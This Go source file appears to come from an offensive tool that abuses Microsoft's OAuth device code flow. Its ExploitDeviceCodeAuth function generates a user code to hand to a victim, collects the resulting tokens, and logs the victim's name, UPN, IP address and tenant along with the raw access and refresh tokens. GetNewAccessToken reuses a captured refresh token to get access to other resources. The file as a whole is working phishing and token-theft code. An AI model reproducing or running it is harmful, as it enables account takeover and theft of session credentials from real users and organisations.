package libs

import (
	"fmt"
	"io"
	"os"
	"strings"

	"github.com/dgrijalva/jwt-go"
	"github.com/rs/zerolog"
	"github.com/rs/zerolog/log"
)

func CheckErrors(err error) {
	if err != nil {
		log.Error().Err(err).Msg("[!] An error occured !")
	}
}

func ParseJWT(tokenstring string) map[string]interface{} {
	token, _, err := new(jwt.Parser).ParseUnverified(tokenstring, jwt.MapClaims{})
	CheckErrors(err)
	if claims, ok := token.Claims.(jwt.MapClaims); ok {
		return claims
	} else {
		return nil
	}
}

func Logging(filepath string) {
	f, err := os.OpenFile(filepath, os.O_RDWR|os.O_CREATE|os.O_APPEND, 0664)
	CheckErrors(err)
	if err == nil {
		writers := io.MultiWriter(zerolog.ConsoleWriter{Out: os.Stderr, TimeFormat: "02 Jan 2006 15:04:05"}, f)
		log.Logger = log.Output(writers)
	}
}

func ExploitDeviceCodeAuth(clientid string, resource string) {
	log.Info().Msg("[*] Generating a new user code")
	respjson := GetuserCode(clientid, resource)
	user_code := respjson["user_code"].(string)
	log.Info().Msg("[+] User Code => " + user_code + " (https://microsoft.com/devicelogin)")
	tokens := GetAccessRefreshTokens(clientid, resource, respjson)
	if tokens != nil {
		access_token := tokens["access_token"].(string)
		refresh_token := tokens["refresh_token"].(string)
		jwtdata := ParseJWT(access_token)
		log.Info().Msg("[+] TID: " + jwtdata["tid"].(string))
		log.Info().Msg("[+] APPID: " + jwtdata["appid"].(string))
		log.Info().Msg("[+] OID: " + jwtdata["oid"].(string))
		log.Info().Msg("[+] AMR: " + strings.Trim(strings.Join(strings.Fields(fmt.Sprint(jwtdata["amr"])), ", "), "[]"))
		log.Info().Msg("[+] UPN: " + jwtdata["upn"].(string))
		log.Info().Msg("[+] NAME: " + jwtdata["name"].(string))
		log.Info().Msg("[+] FAMILY NAME: " + jwtdata["family_name"].(string))
		log.Info().Msg("[+] GIVEN NAME: " + jwtdata["given_name"].(string))
		log.Info().Msg("[+] IP ADDRESS: " + jwtdata["ipaddr"].(string))
		log.Info().Msg("[+] REGION: " + jwtdata["tenant_region_scope"].(string))
		log.Info().Msg("[+] Access Token => " + access_token)
		log.Info().Msg("[+] Refresh Token => " + refresh_token)
	}
}

func GetNewAccessToken(clientid string, resource string, scope string, refreshtoken string) {
	log.Info().Msg("[*] Getting a new access token for the given resource: " + resource)
	tokens := GetAccessTokenFromResfreshToken(clientid, resource, scope, refreshtoken)
	if tokens != nil {
		access_token := tokens["access_token"].(string)
		refresh_token := tokens["refresh_token"].(string)
		log.Info().Msg("[+] Access Token => " + access_token)
		log.Info().Msg("[+] Refresh Token => " + refresh_token)
	}
}
